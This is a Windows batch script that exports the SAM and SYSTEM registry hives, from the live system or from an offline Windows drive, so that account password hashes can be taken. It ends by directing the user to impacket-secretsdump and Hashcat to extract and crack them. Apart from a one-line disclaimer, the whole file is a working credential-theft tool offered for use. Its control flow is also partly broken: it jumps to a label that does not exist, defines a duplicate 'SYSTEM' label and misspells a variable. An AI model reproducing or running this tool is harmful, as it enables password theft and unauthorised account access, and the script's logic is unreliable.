@echo off
setlocal
title Windows Password Hash Exporter
echo Program Name: Windows Password Hash Exporter
echo Version: 3.1.1
echo Developer: @YonatanReuvenIsraeli
echo Website: https://www.yonatanreuvenisraeli.dev
echo License: GNU General Public License v3.0
net session > nul 2>&1
if not "%errorlevel%"=="0" goto "NotAdministrator"
goto "Disclaimer"

:"NotAdministrator"
echo.
echo Please run this batch file as an administrator. Press any key to close this batch file.
pause > nul 2>&1
goto "Done"

:"Disclaimer"
echo.
echo READ DISCLAIMER ^-^-^> THIS IS FOR EDUCATIONAL PURPOSES ONLY! DO NOT USE THIS ON SOMEONE ELSES PC WITHOUT THEIR EXPLICIT PERMISSION! THIS IS A HACK! CONTINUE AT YOUR OWN RISK! WE HOLD NO RESPONSIBILITY FOR ANYTHING THAT HAPPEND, IS HAPPENING, AND/OR WILL HAPPEN BECAUSE OF THIS BATCH FILE!
echo.
set Disclaimer=
set /p Disclaimer="Do you agree to the Disclaimer? (Yes/No) "
if /i "%Disclaimer%"=="Yes" goto "Start"
if /i "%Disclaimer%"=="No" goto "Exit"
echo Invalid syntax!
goto "Disclaimer"

:"Start"
echo.
set DriveLetter=
set /p DriveLetter="What is the drive letter of your Windows installation? (A:-Z:) "
if /i "%DriveLetter%"=="A:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="B:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="C:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="D:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="E:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="F:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="G:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="H:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="I:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="J:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="K:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="L:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="M:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="N:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="O:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="P:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="Q:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="R:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="S:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="T:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="U:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="V:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="W:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="X:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="Y:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="Z:" goto "SureDriveLetter"
echo Invalid syntax!
goto "DriveLetter"

:"SureDriveLetter"
echo.
set SureDriveLetter=
set /p SureDriveLetter="Are you sure "%DriveLetter%" is the drive letter of your Windows installation? (Yes/No) "
if /i "%SureDriveLetter%"=="Yes" goto "CheckExistDriveLetter"
if /i "%SureDriveLetter%"=="No" goto "DriveLetter"
echo Invalid syntax!
goto "SureDriveLetter"

:"CheckExistDriveLetter"
if not exist "%DriveLetter%" goto "NotExist"
if /i "%DriveLetter%"=="%SystemDrive%" goto "Online"
goto "Offline"

:"NotExist"
echo "%DriveLetter%" does not exist. Please try again.
goto "Start"

:"Online"
echo.
set HashPath=
set /p HashPath="Where do you want to save the Windows password hashes to? "
if not exist "%HashPath%" goto "HashPathNotExistOnline"
goto "ExportOnline"

:"HashPathNotExistOnline"
echo "%HashPath%" does not exist. Please try again.
goto "Online"

:"ExportOnline"
echo.
if exist "%HashPath%\Windows Password Hashes" goto "WindowsPasswordHashesExistOnline"
echo.
echo Exporting Windows password hashes on drive letter "%DriveLetter%".
md "%HashPath%\Windows Password Hashes"
reg save HKLM\SAM "%HashPath%\Windows Password Hashes\SAM.save" > nul 2>&1
if not "%errorlevel%"=="0" goto "Error"
reg save HKLM\SYSTEM "%HashPath%\Windows Password Hashes\SYSTEM.save" > nul 2>&1
if not "%errorlevel%"=="0" goto "Error"
echo Windows password hashes exported on drive letter "%DriveLetter%". 
goto "Done"

:"WindowsPasswordHashesExistOnline"
echo.
echo Please rename or move to another location "%HashPath%\Windows Password Hashes" in order for this batch file to proceed. Press any key to continue when you have renamed or moved "%HashPath%\Windows Password Hashes".
pause > nul 2>&1
goto "ExportOnline"

:"Offline"
reg query HKLM | find /i "HKEY_LOCAL_MACHINE\SAM1" > nul 2>&1
if "%errorlevel%"=="0" goto "RegistryExistSAM"
goto "SYSTEM"

:"RegistryExistSAM"
set SAM=True
echo.
echo Please temporary rename to something else or temporary move to another location "HKEY_LOCAL_MACHINE\SAM1" in order for this batch file to proceed. ""HKEY_LOCAL_MACHINE\SAM1"" is not a system hive. Press any key to continue when ""HKEY_LOCAL_MACHINE\SAM1"" is renamed to something else or moved to another location. This batch file will let you know when you can rename it back to its original name or move it back to its original location.
pause > nul 2>&1
goto "Offline"

:"SYSTEM"
reg query HKLM | find /i "HKEY_LOCAL_MACHINE\SYSTEM1" > nul 2>&1
if "%errorlevel%"=="0" goto "RegistryExistSYSTEM"
reg load HKLM\SAM1 "%DriveLetter%\Windows\System32\config\SAM" > nul 2>&1
if not "%errorlevel%"=="0" goto "InvalidWindowsInstallation"
reg load HKLM\SYSTEM1 "%DriveLetter%\Windows\System32\config\SYSTEM" > nul 2>&1
goto "HashPath"

:"RegistryExistSYSTEM"
set SYSTEM=True
echo.
echo Please temporary rename to something else or temporary move to another location "HKEY_LOCAL_MACHINE\SYSTEM1" in order for this batch file to proceed. "HKEY_LOCAL_MACHINE\SYSTEM1" is not a system hive. Press any key to continue when "HKEY_LOCAL_MACHINE\SYSTEM1" is renamed to something else or moved to another location. This batch file will let you know when you can rename it back to its original name or move it back to its original location.
pause > nul 2>&1
goto "SYSTEM"

:"InvalidWindowsInstallation"
echo "%DriveLetter%" is an invalid Windows installation! Please try again.
goto "Start"

:"HashPath"
echo.
set HashPath=
set /p HashPath="Where do you want to save the Windows password hashes to? "
if not exist "%HashPath%" goto "HashPathNotExistOffline"
goto "ExportOffline"

:"HashPathNotExistOffline"
echo "%HashPath%" does not exist. Please try again.
goto "HashPath"

:"ExportOffline"
echo.
if exist "%HashPath%\Windows Password Hashes" goto "WindowsPasswordHashesExistOffline"
echo Exporting Windows password hashes on drive letter "%DriveLetter%".
md "%HashPath%\Windows Password Hashes"
reg save HKLM\SAM1 "%HashPath%\Windows Password Hashes\SAM.save" > nul 2>&1
if not "%errorlevel%"=="0" goto "Error"
reg save HKLM\SYSTEM1 "%HashPath%\Windows Password Hashes\SYSTEM.save" > nul 2>&1
if not "%errorlevel%"=="0" goto "Error"
echo Windows password hashes exported on drive letter "%DriveLetter%". 
reg unload HKLM\SAM1 > nul 2>&1
reg unload HKLM\SYSTEM1 > nul 2>&1
goto "RegistrySAMDone"

:"WindowsPasswordHashesExistOffline"
echo.
echo Please rename or move to another location "%HashPath%\Windows Password Hashes" in order for this batch file to proceed. Press any key to continue when you have renamed or moved "%HashPath%\Windows Password Hashes".
pause > nul 2>&1
goto "ExportOffline"

:"Error"
echo There has been an error. you can try again.
goto "Start"

:"RegistrySAMDone"
if "%SAM%"=="True" goto "SAM"
goto "RegistrySYSTEMDone"

:"SAM"
echo.
echo You can now rename or move back the hive back to "HKEY_LOCAL_MACHINE\SAM1".
goto "RegistrySYSTEMDone"

:"RegistrySYSTEMDone"
if "%YSTEM%"=="True" goto "SYSTEM"
goto "Done"

:"SYSTEM"
echo.
echo You can now rename or move back the hive back to "HKEY_LOCAL_MACHINE\SYSTEM1".
goto "Done"

:"Done"
echo.
echo Use impacket-secretsdump in Kali Linux to extract the hashes from "%HashPath%\Windows Password Hashes". You can then use a tool like Hashcat to crack the hash. Press any key to close this batch file.
endlocal
pause > nul 2>&1
exit
